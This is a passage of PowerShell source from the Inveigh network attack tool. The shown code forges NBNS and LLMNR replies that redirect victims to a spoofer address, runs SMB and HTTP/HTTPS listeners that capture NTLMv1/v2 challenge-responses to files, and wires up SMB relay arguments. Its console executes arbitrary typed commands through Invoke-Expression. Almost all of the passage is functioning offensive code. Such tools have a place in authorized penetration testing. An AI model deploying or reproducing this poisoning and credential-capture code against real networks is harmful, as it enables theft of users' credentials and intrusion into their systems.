                $UDP_length = $binary_reader.ReadBytes(2)
                $UDP_length_2  = DataToUInt16 ($UDP_length)
                [void]$binary_reader.ReadBytes(2)
                $payload_data = $binary_reader.ReadBytes(($UDP_length_2 - 2) * 4)
            }
        }
        
        # Incoming packets 
        switch ($destination_port)
        {
            137 { # NBNS
                if($payload_data[5] -eq 1)
                {
                    try
                    {
                        $UDP_length[0] += 16
                        
                        [Byte[]] $NBNS_response_data = $payload_data[13..$payload_data.length]`
                            + (0x00,0x00,0x00,0xa5,0x00,0x06,0x00,0x00)`
                            + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()`
                            + (0x00,0x00,0x00,0x00)
                
                        [Byte[]] $NBNS_response_packet = (0x00,0x89)`
                            + $source_port[1,0]`
                            + $UDP_length[1,0]`
                            + (0x00,0x00)`
                            + $payload_data[0,1]`
                            + (0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20)`
                            + $NBNS_response_data
                
                        $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                        $send_socket.SendBufferSize = 1024
                        $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
                    
                        $NBNS_query_type = [System.BitConverter]::ToString($payload_data[43..44])
                    
                        switch ($NBNS_query_type)
                        {
                            '41-41' {
                                $NBNS_query_type = '00'
                            }
                            '41-44' {
                                $NBNS_query_type = '03'
                            }
                            '43-41' {
                                $NBNS_query_type = '20'
                            }
                            '42-4C' {
                                $NBNS_query_type = '1B'
                            }
                            '42-4D' {
                            $NBNS_query_type = '1C'
                            }
                            '42-4E' {
                            $NBNS_query_type = '1D'
                            }
                            '42-4F' {
                            $NBNS_query_type = '1E'
                            }
                        }
      
                        if($NBNS -eq 'y')
                        {
                            if ($NBNSTypes -contains $NBNS_query_type)
                            { 
                                if ($hash.IP_capture_list -notcontains $source_IP)
                                {
                                    [void]$send_socket.sendTo( $NBNS_response_packet, $destination_point )
                                    $send_socket.Close( )
                                    $NBNS_response_message = "- spoofed response has been sent"
                                }
                                else
                                {
                                    $NBNS_response_message = "- spoof suppressed due to previous capture"
                                }
                            }
                            else
                            {
                                $NBNS_response_message = "- spoof not sent due to disabled type"
                            }
                        }
                
                        $NBNS_query = [System.BitConverter]::ToString($payload_data[13..$payload_data.length])
                        $NBNS_query = $NBNS_query -replace "-00",""
                        $NBNS_query = $NBNS_query.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                        $NBNS_query_string_encoded = New-Object System.String ($NBNS_query,0,$NBNS_query.Length)
                        $NBNS_query_string_encoded = $NBNS_query_string_encoded.Substring(0,$NBNS_query_string_encoded.IndexOf("CA"))
                        
                        $NBNS_query_string_subtracted = ""
                        $NBNS_query_string = ""
                        
                        $n = 0
                        
                        do
                        {
                            $NBNS_query_string_sub = (([byte][char]($NBNS_query_string_encoded.Substring($n,1)))-65)
                            $NBNS_query_string_subtracted += ([convert]::ToString($NBNS_query_string_sub,16))
                            $n += 1
                        }
                        until($n -gt ($NBNS_query_string_encoded.Length - 1))
                    
                        $n = 0
                    
                        do
                        {
                            $NBNS_query_string += ([char]([convert]::toint16($NBNS_query_string_subtracted.Substring($n,2),16)))
                            $n += 2
                        }
                        until($n -gt ($NBNS_query_string_subtracted.Length - 1))

                        $hash.console_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                        $hash.log_file_queue.add("$(Get-Date -format 's') - NBNS request for $NBNS_query_string<$NBNS_query_type> received from $source_IP $NBNS_response_message")
                    
                    }
                    catch{}
                }
            }
            139
            {
                if($SMB -eq 'y')
                {
                    SMBNTLMResponse $payload_data
                }
            }
            445 { # SMB
                if($SMB -eq 'y')
                {
                    SMBNTLMResponse $payload_data
                }
            }
            5355 { # LLMNR
                $UDP_length[0] += $payload_data.length - 2
                
                [Byte[]] $LLMNR_response_data = $payload_data[12..$payload_data.length]
                    $LLMNR_response_data += $LLMNR_response_data`
                    + (0x00,0x00,0x00,0x1e,0x00,0x04)`
                    + ([IPAddress][String]([IPAddress]$SpooferIP)).GetAddressBytes()
            
                [Byte[]] $LLMNR_response_packet = (0x14,0xeb)`
                    + $source_port[1,0]`
                    + $UDP_length[1,0]`
                    + (0x00,0x00)`
                    + $payload_data[0,1]`
                    + (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)`
                    + $LLMNR_response_data
            
                $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
                $send_socket.SendBufferSize = 1024
                $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
     
                if($LLMNR -eq 'y')
                {
                    if ($hash.IP_capture_list -notcontains $source_IP)
                    {
                        [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
                        $send_socket.Close( )
                        $LLMNR_response_message = "- spoofed response has been sent"
                    }
                    else
                    {
                        $LLMNR_response_message = "- spoof suppressed due to previous capture"
                    }
                }
                
                $LLMNR_query = [System.BitConverter]::ToString($payload_data[13..($payload_data.length - 4)])
                $LLMNR_query = $LLMNR_query -replace "-00",""
                $LLMNR_query = $LLMNR_query.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
             
                $hash.console_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
                $hash.log_file_queue.add("$(Get-Date -format 's') - LLMNR request for $LLMNR_query_string received from $source_IP $LLMNR_response_message")
            }
        }
        
        # Outgoing packets
        switch ($source_port)
        {
            139 {
                if($SMB -eq 'y')
                {   
                    $NTLM_challenge = SMBNTLMChallenge $payload_data
                }
            }
            445 { # SMB
                if($SMB -eq 'y')
                {   
                    $NTLM_challenge = SMBNTLMChallenge $payload_data
                }
            }
        }
    }
}

# End ScriptBlocks
# Begin Startup Functions

# HTTP/HTTPS Listener Startup Function 
Function Invoke-InveighHTTP()
{
    $HTTP_listener = New-Object System.Net.HttpListener

    if($HTTP -eq 'y')
    {
        $HTTP_listener.Prefixes.Add('http://*:80/')
    }

    if(($HTTP -eq 'n') -and ($HTTPS -eq 'y'))
    {
        $HTTP_listener.Prefixes.Add('http://127.0.0.1:80/')
    }

    if($HTTPS -eq 'y')
    {
        $HTTP_listener.Prefixes.Add('https://*:443/')
    }

    $HTTP_listener.AuthenticationSchemes = "Anonymous" 
    $HTTP_listener.Start()
    $HTTP_runspace = [runspacefactory]::CreateRunspace()
    $HTTP_runspace.Open()
    $HTTP_runspace.SessionStateProxy.SetVariable('Hash',$hash)
    $HTTP_powershell = [powershell]::Create()
    $HTTP_powershell.Runspace = $HTTP_runspace
    $HTTP_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_challenge_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_response_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_relay_execute_scriptblock) > $null
    $HTTP_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($HTTP_listener).AddArgument($SMBRelay).AddArgument(
        $SMBRelayTarget).AddArgument($SMBRelayCommand).AddArgument($SMBRelayUsernames).AddArgument($SMBRelayAutoDisable).AddArgument(
        $SMBRelayNetworkTimeout).AddArgument($Repeat).AddArgument($ForceWPADAuth) > $null
    $HTTP_handle = $HTTP_powershell.BeginInvoke()
}

# Sniffer/Spoofer Startup Function
Function Invoke-InveighSniffer()
{
    $sniffer_runspace = [runspacefactory]::CreateRunspace()
    $sniffer_runspace.Open()
    $sniffer_runspace.SessionStateProxy.SetVariable('Hash',$hash)
    $sniffer_powershell = [powershell]::Create()
    $sniffer_powershell.Runspace = $sniffer_runspace
    $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($LLMNR_response_message).AddArgument(
        $NBNS_response_message).AddArgument($IP).AddArgument($SpooferIP).AddArgument($SMB).AddArgument(
        $LLMNR).AddArgument($NBNS).AddArgument($NBNSTypes).AddArgument($Repeat).AddArgument($ForceWPADAuth) > $null
    $sniffer_handle = $sniffer_powershell.BeginInvoke()
}

# End Startup Functions

# Startup Enabled Services

# HTTP Server Start
if(($HTTP -eq 'y') -or ($HTTPS -eq 'y'))
{
    Invoke-InveighHTTP
    $web_request = [System.Net.WebRequest]::Create('http://127.0.0.1/stop') # Temp fix for HTTP shutdown
    $web_request.Method = "GET"
}

# Sniffer/Spoofer Start - always enabled
Invoke-InveighSniffer

Function Exit-Inveigh
{
    $hash.running = $false
    if($HTTPS -eq 'y')
    {
        Invoke-Expression -command "netsh http delete sslcert ipport=0.0.0.0:443" > $null
        
        try
        {
            $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
            $certificate_store.Open('ReadWrite')
            $certificate = $certificate_store.certificates.find("FindByThumbprint",$certificate_thumbprint,$FALSE)[0]
            $certificate_store.Remove($certificate)
            $certificate_store.Close()
        }
        catch
        {
            write-warning 'SSL Certificate Deletion Error - Remove Manually'
        }
    }
        
    write-warning "Inveigh exited at $(Get-Date -format 's')"
    
    "$(Get-Date -format 's') - Inveigh exited"| Out-File $log_out_file -Append
    

    if(($HTTP -eq 'y') -or ($HTTPS -eq 'y'))
    {
        try
        {
            $web_request.GetResponse()
        }
        catch {}
    }
} 

Function ConsoleOutput
{
    if($hash.console_queue.Count -gt 0)
    {
        switch -wildcard ($hash.console_queue[0])
        {
            "*local administrator*"
            {
                write-warning $hash.console_queue[0]
                $hash.console_queue.RemoveRange(0,1)
            }
            "*NTLMv1 challenge/response written*"
            {
                if($Output -eq 0 -or $Output -eq 2)
                {
                    write-warning ($hash.console_queue[0] + $NTLMv1_out_file)
                }
                $hash.console_queue.RemoveRange(0,1)
            }
            "*NTLMv2 challenge/response written*"
            {
                if($Output -eq 0 -or $Output -eq 2)
                {
                    write-warning ($hash.console_queue[0] + $NTLMv2_out_file)
                }
                $hash.console_queue.RemoveRange(0,1)
            }
            "* relay *"
            {
                write-warning $hash.console_queue[0]
                $hash.console_queue.RemoveRange(0,1)
            }
            "Service *"
            {
                write-warning $hash.console_queue[0]
                $hash.console_queue.RemoveRange(0,1)
            }
            default
            {
                write-output $hash.console_queue[0]
                $hash.console_queue.RemoveRange(0,1)
            }
        }    
    }
}

Function FileOutputLog
{
    if($hash.log_file_queue.Count -gt 0)
    {
        $hash.log_file_queue[0]|Out-File $log_out_file -Append
        $hash.log_file_queue.RemoveRange(0,1)
    }
}

Function FileOutputNTLMv1
{
    if($hash.NTLMv1_file_queue.Count -gt 0)
    {
        $hash.NTLMv1_file_queue[0]|Out-File $NTLMv1_out_file -Append
        $hash.NTLMv1_file_queue.RemoveRange(0,1)
    }
}

Function FileOutputNTLMv2
{
    if($hash.NTLMv2_file_queue.Count -gt 0)
    {
        $hash.NTLMv2_file_queue[0]|Out-File $NTLMv2_out_file -Append
        $hash.NTLMv2_file_queue.RemoveRange(0,1)
    }
}

# Main Loop
try
{   
    $main_running = $true
    
    if($RunTime -ne '')
    {    
        $main_timeout = new-timespan -Minutes $RunTime
        $main_stopwatch = [diagnostics.stopwatch]::StartNew()
    }
    
    :console_loop while($main_running)
    {
        
        if($RunTime -ne '')
        {
            if($main_stopwatch.elapsed -ge $main_timeout)
            {
                $main_running = $false
            }
        }
        
        if($Output -eq 0 -or $Output -eq 1)
        {
            ConsoleOutput
        }
        
        if($Output -eq 0 -or $Output -eq 2)
        {
            FileOutputLog
            FileOutputNTLMv1
            FileOutputNTLMv2
        }

        if([console]::KeyAvailable)
        {

            $keypress = [Console]::ReadKey()
            if ($keypress.key -eq 'Enter')
            {
                write-warning "Console Prompt Opened - Enter OPTIONS for help"
                while (($console_input -ne 'RESUME') )
                {
                    $console_input = Read-Host -Prompt 'Inveigh'

                    switch ($console_input)
                    {
                        OPTIONS
                        {
                            write-output ''
                            write-output 'Enter QUIT to exit Inveigh'
                            write-output 'Enter RESUME to close this console and resume displaying real time output if enabled'
                            write-output 'Press ENTER to display queued output'
                            write-output 'Console will also accept standard command line input (e.g., ipconfig)'
                            write-warning 'Avoid using CTRL+C while the console prompt is open'
                            write-output ''
                        }
                        QUIT
                        {
                            BREAK console_loop
                        }
                        ""
                        {
                            while($hash.console_queue.Count -gt 0)
                            {
                                ConsoleOutput
                            }
                        }
                        default
                        {
                            if ($console_input -ne 'RESUME')
                            {
                                try
                                {
                                    Invoke-Expression -command $console_input
                                }
                                catch
                                {
                                    write-warning -message $_
                                }
                            }
                        }
                    }
                }
                $console_input = ''
                write-warning 'Console Prompt Closed - Status output will resume if enabled'
            }
        }
    }
}
finally
{
    Exit-Inveigh
}